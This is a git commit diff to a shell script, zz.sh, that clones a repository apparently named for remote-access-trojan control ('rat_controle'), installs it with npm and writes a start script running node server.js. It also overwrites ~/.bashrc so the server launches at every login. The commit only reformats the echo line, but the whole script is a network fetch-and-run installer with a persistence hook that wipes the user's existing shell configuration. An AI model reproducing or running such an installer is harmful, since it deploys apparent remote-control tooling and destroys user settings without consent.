099c0b8efb93ac868d4628451d67a9a80ae1a389
zxoman <66860395+zxoman@users.noreply.github.com>
2026-04-29 20:03:14 +0300

    Update zz.sh

--- zz.sh
+++ zz.sh
@@ -4,8 +4,6 @@ cd ~ && \
 git clone https://github.com/zxoman/rat_controle.git && \
 cd rat_controle && \
 npm install && \
-echo '
-cd ~/rat_controle
-node server.js' > ~/start.sh
+echo -e "cd ~/rat_controle\nnode server.js" > ~/start.sh
 chmod +x start.sh
 echo 'bash ~/start.sh' > ~/.bashrc
